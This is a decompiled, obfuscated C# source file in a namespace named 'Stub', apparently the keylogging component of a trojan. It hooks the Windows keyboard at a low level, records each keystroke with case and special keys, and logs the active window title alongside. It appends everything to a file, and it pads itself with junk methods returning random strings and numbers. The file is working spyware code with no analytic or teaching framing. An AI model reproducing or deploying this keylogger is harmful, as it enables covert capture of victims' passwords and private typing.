using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace Stub;

public class GClass0
{
	private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

	private static string VGbhofnMM69b77tivwV6bNE8vESCM;

	private const int OUJqZ98u0qam3mvQ9UKC7wCP7wqTI = 256;

	private static LowLevelKeyboardProc X8bRVfFQ5sAGvkl4tgFHOJlFKjA1Y = MrAnAbnskp1UqAhWTp77uWNWKSqloXAGZIbjB4sanMzh;

	private static IntPtr TDl8QeoY4NniWJOZGfEcCeZub52n4 = IntPtr.Zero;

	private static int int_0 = 13;

	public static void xTKcL5gOP8hMPciq6VSFrPPLmply6rQdE1JPLR2mPdNV()
	{
		TDl8QeoY4NniWJOZGfEcCeZub52n4 = lNOGP0glcQaXocBF2k7AYLJTnVbbwvozc4V3MsJflVF5(X8bRVfFQ5sAGvkl4tgFHOJlFKjA1Y);
		Application.Run();
	}

	private static IntPtr lNOGP0glcQaXocBF2k7AYLJTnVbbwvozc4V3MsJflVF5(LowLevelKeyboardProc y4jrKdWM7atUIWMRAUV2JtMpvWte00dWY8SdDOmzvDew)
	{
		using Process process = Process.GetCurrentProcess();
		return SetWindowsHookEx(int_0, y4jrKdWM7atUIWMRAUV2JtMpvWte00dWY8SdDOmzvDew, GetModuleHandle(process.ProcessName), 0u);
	}

	private static IntPtr MrAnAbnskp1UqAhWTp77uWNWKSqloXAGZIbjB4sanMzh(int itvzG1dITG9u0QUNw37Wd9HawFJZrk0cRp2agFanWReO, IntPtr pCKUbTPKMWoieAGQILliPnRtzxTCS, IntPtr IPvVoA7yv1Bhpw9JXGyqxu8osJc76)
	{
		if (itvzG1dITG9u0QUNw37Wd9HawFJZrk0cRp2agFanWReO >= 0 && pCKUbTPKMWoieAGQILliPnRtzxTCS == (IntPtr)256)
		{
			object obj = Marshal.ReadInt32(IPvVoA7yv1Bhpw9JXGyqxu8osJc76);
			object obj2 = (GetKeyState(20) & 0xFFFF) != 0;
			object obj3 = ((((uint)GetKeyState(160) & 0x8000u) != 0 || ((uint)GetKeyState(161) & 0x8000u) != 0) ? true : false);
			object obj4 = lh2RQuLlhLwLxuTdCKIssae6ofTvi(Conversions.ToUInteger(obj));
			obj4 = ((!Conversions.ToBoolean((Conversions.ToBoolean(obj2) || Conversions.ToBoolean(obj3)) ? ((object)true) : ((object)false))) ? RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj4, (Type)null, "ToLower", new object[0], (string[])null, (Type[])null, (bool[])null)) : RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj4, (Type)null, "ToUpper", new object[0], (string[])null, (Type[])null, (bool[])null)));
			if (Conversions.ToInteger(obj) >= 112 && Conversions.ToInteger(obj) <= 135)
			{
				obj4 = "[" + Conversions.ToString(Conversions.ToInteger(obj)) + "]";
			}
			else
			{
				switch (((Enum)(Keys)Conversions.ToInteger(obj)).ToString())
				{
				case "Space":
					obj4 = "[SPACE]";
					break;
				case "Return":
					obj4 = "[ENTER]";
					break;
				case "Escape":
					obj4 = "[ESC]";
					break;
				case "LControlKey":
					obj4 = "[CTRL]";
					break;
				case "RControlKey":
					obj4 = "[CTRL]";
					break;
				case "RShiftKey":
					obj4 = "[Shift]";
					break;
				case "LShiftKey":
					obj4 = "[Shift]";
					break;
				case "Back":
					obj4 = "[Back]";
					break;
				case "LWin":
					obj4 = "[WIN]";
					break;
				case "Tab":
					obj4 = "[Tab]";
					break;
				case "Capital":
					obj4 = ((!Operators.ConditionalCompareObjectEqual(obj2, (object)true, false)) ? "[CAPSLOCK: ON]" : "[CAPSLOCK: OFF]");
					break;
				}
			}
			using StreamWriter streamWriter = new StreamWriter(LLQqOMuku02a3eSHe7KxkMgL5QsXp0CTkIoG4QmrIXrV.oxPX0jdV1FQPxyPho7HYKUgRwXbDcrxkBq5S6aiV3HVw, append: true);
			if (object.Equals(VGbhofnMM69b77tivwV6bNE8vESCM, MXV5WxZw4ZtHFVu9k7AIRn4PAH35H()))
			{
				streamWriter.Write(RuntimeHelpers.GetObjectValue(obj4));
			}
			else
			{
				streamWriter.WriteLine(Environment.NewLine);
				streamWriter.WriteLine("###  " + MXV5WxZw4ZtHFVu9k7AIRn4PAH35H() + " ###");
				streamWriter.Write(RuntimeHelpers.GetObjectValue(obj4));
			}
		}
		return CallNextHookEx(TDl8QeoY4NniWJOZGfEcCeZub52n4, itvzG1dITG9u0QUNw37Wd9HawFJZrk0cRp2agFanWReO, pCKUbTPKMWoieAGQILliPnRtzxTCS, IPvVoA7yv1Bhpw9JXGyqxu8osJc76);
	}

	private static string lh2RQuLlhLwLxuTdCKIssae6ofTvi(uint uint_0)
	{
		uint AEIjaFkKCI2yanlOPmaAYG1ljT4ki = 0u;
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			object obj = new byte[256];
			if (!GetKeyboardState((byte[])obj))
			{
				return "";
			}
			object obj2 = MapVirtualKey(uint_0, 0u);
			IntPtr keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), out AEIjaFkKCI2yanlOPmaAYG1ljT4ki));
			ToUnicodeEx(uint_0, Conversions.ToUInteger(obj2), (byte[])obj, stringBuilder, 5, 0u, keyboardLayout);
			return stringBuilder.ToString();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return ((Enum)(Keys)checked((int)uint_0)).ToString();
	}

	private static string MXV5WxZw4ZtHFVu9k7AIRn4PAH35H()
	{
		uint AEIjaFkKCI2yanlOPmaAYG1ljT4ki = 0u;
		try
		{
			IntPtr foregroundWindow = GetForegroundWindow();
			GetWindowThreadProcessId(foregroundWindow, out AEIjaFkKCI2yanlOPmaAYG1ljT4ki);
			object processById = Process.GetProcessById(checked((int)AEIjaFkKCI2yanlOPmaAYG1ljT4ki));
			object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(processById, (Type)null, "MainWindowTitle", new object[0], (string[])null, (Type[])null, (bool[])null));
			if (string.IsNullOrWhiteSpace(Conversions.ToString(objectValue)))
			{
				objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(processById, (Type)null, "ProcessName", new object[0], (string[])null, (Type[])null, (bool[])null));
			}
			VGbhofnMM69b77tivwV6bNE8vESCM = Conversions.ToString(objectValue);
			return Conversions.ToString(objectValue);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "???";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr SetWindowsHookEx(int int_1, LowLevelKeyboardProc ZBSb35r02kKz4FHaT6KdMUjXDUtzm, IntPtr DMJ1R5m2So0cMUW60CFKSU8uni3L2, uint uint_0);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool UnhookWindowsHookEx(IntPtr UdlgzlA8kkNGd0aDyXYv748TyD6rs);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr CallNextHookEx(IntPtr intptr_0, int U41OjnuUvic6EivS215vhAvuiiYys, IntPtr kSjLMPDy2c63Olb4JV1E3w1V7Awwp, IntPtr kJ0B48VBdiZ7Cfza1vU0fjJ1jY2MU);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string string_0);

	[DllImport("user32.dll")]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", SetLastError = true)]
	private static extern uint GetWindowThreadProcessId(IntPtr xcXbIDXXKVjLRg9r8AD7qxE0SudIO, out uint AEIjaFkKCI2yanlOPmaAYG1ljT4ki);

	[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
	private static extern short GetKeyState(int ZKk9TiRmSwAMroBqoGi5CADrHwy8x);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern bool GetKeyboardState(byte[] fzGVgLs4NsA6FOhvNh2IkF9CfQeZV);

	[DllImport("user32.dll")]
	private static extern IntPtr GetKeyboardLayout(uint inH7QFDs8EOJ6ZPGPBriDrtu5RG7E);

	[DllImport("user32.dll")]
	private static extern int ToUnicodeEx(uint Autyr4yi01bxgqOF1xTlyg7GLSA4U, uint J268N2yaUxK1GKHJ9siVcp0RPpLoJ, byte[] LEJytsXzP2KUqRze7eejYsRPV0z61, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder tNVj2FPRfSFYCbhQP0OJ8i8PzL1uT, int pEr31oK9e1le9ZJ9QdakwVgcUxkkr, uint uint_0, IntPtr intptr_0);

	[DllImport("user32.dll")]
	private static extern uint MapVirtualKey(uint h4ux3cVZvv7kG9vGKo31COzszrK3d, uint OapzxVfnKOX1RFMnPCpIJdtdFMW4g);

	public static string smethod_0()
	{
		return "rDxyWyBSTnzPKXgEo61HBqcUjq5bwa6QghBIWDHytrOmA2311TWKNmUkAv8vMdoBKx9fBldVQ1hn2fM";
	}

	public static int OJ5JDVbnQM5JCeyflNQP7eUoVee0Qi90mqHPYI9wv2v8pw9Cvj401UJ9FFfSIVo2wyF8e5AcU7i2YEP()
	{
		return 67598602;
	}

	public static string fKeP0yjqff9bW93xIIchobB1wVGF38c8Hlyi4rrLauMAlyt1L7wmag88OZMXjkDJAFoAahnitocc8Am()
	{
		return "saKBRexZkotX96OO5H9k4iEawydRpa3cYdKywDi3AHJCYQavee2PcExZxI5A5VTlLGl8uh9KAdtkQ8X";
	}

	public static int a5bUmFD3fycH8FW7cy1TBMcMyu8CeIBzsttofdcakthVlhXUN89OJG53GiUcZgyvpMUgc5wG6t0fOWo()
	{
		return 23881154;
	}

	public static string mZ8ojivLckICYX9uiAAnkf0MLaXZigBOaY1C1aBLeSsNvNj5Vi3tU0WhygbqJHOlClpgYHJeszNwdWl()
	{
		return "FiByYcsYC0bynASSBWOhM9RFc83RQFHohf6dyXCs5NdQs7L0OY4Zjln7CPVAPml3FKd7wj3GTQRJWuD";
	}

	public static int Nnt1BTnJm8dg9AiQ09Azwxw30qQa24PMWZPnEJbi6ZNQVL0WbPa30LvlsQqNsf2Wu0dAyasfsO339vK()
	{
		return 24823623;
	}

	public static string nuPH2s0Mdjqxe8OkuRLHfHcN2LXNRY1zu39NUkjEqkZX8khINegk2O5ZHuOsxtYQU2Wp5kEg0jRgldY()
	{
		return "FfKcFkv7pMiNKaqlcNBroKpNBzPykG6Ze5d3CSTuq3h3BF3qvdY3W7tEL2MqjYXOq6NkuRxxg1jYLDb";
	}

	public static int smethod_1()
	{
		return 51458671;
	}

	public static string smethod_2()
	{
		return "CpZJ8ANbmlZUjn3aZ97apxLLtWcYONl0jhSERk4dfsB1xbIZRFKgDTWDfive3hgFXJecZYkEXD5vynE";
	}

	public static int W1vBhg9jMjsgKDhHhgMkZXLFCmPabUFzaUzo8VWxICYpgBWgeE7NNfmKUOG5xoSQFDwAjxCLjCuo82H()
	{
		return 49560697;
	}

	public static string QFWIV9OpgcfDfGkXmPOFwQuf5hMYZ86N1roECfhrterN4slP4ikhsloaUqSkdZJzTkIX06kUSz4Nwxe()
	{
		return "1GncmFiqG6u2yItqDF6SR0UTT7QpLMasvecVYeGZcyNezSTbnvo70U4otPzk7rIQnnPs0AdDvHZEZ6a";
	}

	public static int smethod_3()
	{
		return 33836983;
	}

	public static string smethod_4()
	{
		return "lqTRieyhpWo1fRNvhPZB8UA9GtCnxAQldsPdGaV3NS6bbXAccnNogDCMpLDiQBlNA1g5DxuiW6elJMe";
	}

	public static int xqfQF39iD8mzOcTdIW8N5OTxncNEgJqiyNU2LwzqzWyqbukFLD9Wn7coVHeJjvdrjd2tYLDio30JVMH()
	{
		return 81594451;
	}

	public static string lzGHhC8PgFGJ6je5XWXPI7zmqNtw9IF1Yj8wBdA38C0vw8OW5Sik0V2D0RhFyN1o5gYeHJJ51Tpdb9H()
	{
		return "yftlcnC2EXSEMZWwgWEMFjQ6n5jryNdILJ12owwILDn7waQwLJDBTVOBNL90QGsGhgiC6tUOFiBslon";
	}

	public static int lJq4OtUzGFTMhhNxVCjSWYVoHYzRYsQqJkSW5NMbLzYgCio1bcslffRqKFR6KNug6SaPZzx8WJ4A6uj()
	{
		return 87657737;
	}

	public static string wpCMDaeHjGHoI58haeDK9XVHnb0MZvBx51zOl88xpL1CdHakkdyLiO0EUKOttoz5r82gcqUENMTShEi()
	{
		return "HZnurVHIi70juUekE8kwU01ltrsN7dzLMZrMT9HERfY57UXPanJkzzGR9M7O4q4J0ObbfseAhwVupwZ";
	}

	public static int lyCWUse8gsoXy7gWBUe0HHssRdMT4EJaRemn71KLsfoEYlLDJga78BK8eJmkQ4P6DYJEDoG0xymTvRd()
	{
		return 33836983;
	}

	public static string HJ3IlNgitARq21ZqB4GXDAAKs2oE1J2hPOG3lm6aTMA72eIjlokWIlVYa5hPWctWB157mcABZSyLZg5()
	{
		return "n6dSy7yvE2vKlCBWb8OBL4JkRTilPOyaTBtbCydoyUZcSLUthw6dOl1XsBWE8JXN79Mygh9OBif7xYB";
	}

	public static int MqJMAYf5TZXCvDY13V8z9QBtMubcdtiYKF70yw50C70w5dQcwE9sgT17eOvm4VwgqO2bU8DtDNyBpfH()
	{
		return 42807109;
	}

	public static string TyzbN5yGZJhQxf9Gfzc90iWy7Jg6Pd7iGfjb8HTbDARTzE6QqVV6wFyrrM9nt7C8mVxod3rIGifQfVJ()
	{
		return "Xz8zOyFa9UKaOUNz5I9YmsKw8Tkbj8GYorPEvPjJpAdJ7LFQJs4hOi5uhESEclZVR8DmPT47B2AIQvP";
	}

	public static int P5Hzz1L01cJg2cUeUId3LCNIN55slL5yxJlJSvyH7diGVk7fTPEN8E8gyqjWYSGLw6F7RA1lNtIW1EN()
	{
		return 5580024;
	}

	public static string CIf0tFIw5CIk2fB2F9064cNEejauz1wdnUEqK3vwGkqVBgD5HsOgt5VuJGfrsoEcBB8OXpXgsUEGHsm()
	{
		return "edGKqgnlsQt4TLLod9C9eGD9fAfYIq869BVXPnjMjo5m0IQL8SHJGuZyZJqV9nKCHvgApEROuQuBvV0";
	}

	public static int XFfCavlJQywYGgem5SKknFPt5jXEU3WdnF44fELL2YcVpNlJNF339wOhs1zzBejhku9ujUXPTzWsnyk()
	{
		return 72624326;
	}

	public static string Uyhoa6k22bxMzQBK3ZQTPGXiUKiLO5d9p4fBQDkGM2aNYvGY1BPnJ7hQvJEhjzwAxBxPjeNz6HzzGt8()
	{
		return "FtyRlhogfk73fw1iHRQsFrjAD4HJqZwPt7V998AIddzXYZYvEXrdG7qoeg9crP6soHXyyxdJ2ltMLNs";
	}

	public static int ciYgPCwM1aHuSUwMpH7mTme9WRLseyC54OqWhylqWWVrHQzMhlVfkBxGqlR6S6n2NRnq7XEdYGdHA2i()
	{
		return 42807109;
	}

	public static string JuJu1l5Gz1yt1G1Iy6Bjst76F57zb272LWURyULdPmmWdJxKhEnbgDDsHtXEdkEVxcmZJJ0N9rQxGLr()
	{
		return "ksAu1MJzYZfdNW2i8p3ivx6NUbF2TdJUJCzcMbkObRiEbBUk5Im2H53HTPYk8ApvMe7NVXg5NX2lj51";
	}

	public static int fWtzD0H98RGYXvSoW3SuajLUQIa0LPGpaGBUc8OGTDQyClXnUf4gRoI4HKuGKiiTZT6GGScob0ABIkA()
	{
		return 33836983;
	}

	public static string ZfQTstiY1yVyylYxb8ahlDVR8l5G2tfTmMqGn52tYmC4zuO1HInZtU3OZnUrCJv4iTrHBqKgR1xKBmh()
	{
		return "hmyn6ol4kHbkvaSnvqoaSY4jPWAc5sZ0beweDXkjsylV2nCwN35oO0RMBYKNsWX7UtM8cUESmB7OG5Q";
	}

	public static int BC62VUVCORXWTnMOobjDhHA79fMBCQpOT3OCLUBvoaKb4o414XgZJTrHYvzx2JgTuCl2FtCriMkHWV3()
	{
		return 24874686;
	}

	public static string BRfJ8xRVryGvZoQep3OAqeTTvloPcCZKhl6vMGOME01OhzOuGeMqaRkcdl5AfTOyZOzO0Oba4CtigxG()
	{
		return "19lalSR4RO0JxHeya8ckn3bpFVLJFkueym33NrNTIWIC5lOfC91RyHjYMPBVxNjXv8detZmZ6HaR2we";
	}

	public static int HdXJVeoAXxyq1Gzy5pYaIbN4FEZAlYJksS2fVVFFkFLiQmuNFeqqRsW9HmhDM2B0ul9TprxUvswiL1c()
	{
		return 72624326;
	}

	public static string jde9ZT1Vqhgd0JJKG7yyhry0aziFcWVbUrYHLhgFe4KoSgiuEjEQ4NxVk5TWMLgI0w8hoZ7LmKekSH2()
	{
		return "NxgADoRHb6rna3YbFtOmUKLXKKkPbDZNi32Sctz6UchukUNpIx5OcjBflxAZq5pnrsEtoYKJ6ACLKJe";
	}

	public static int vEgh7ZXrIxYuO450KIXR1fhT6TgJSYAYtB6AtvxCMeBNJX0G2zJZLELvol7Jbjiz8CaNs5MHYh2p0PK()
	{
		return 15485943;
	}

	public static string YJsG7NWiKWjnAbgUZRHld()
	{
		return "QaCemjugXtKbeHxUXjgdwjXrH40AdXFtfDpopBRnliIo7yU7rpRVPLkh9XX7z79kert7XiM3ItmCZa0";
	}

	public static int smethod_5()
	{
		return 61905559;
	}
}
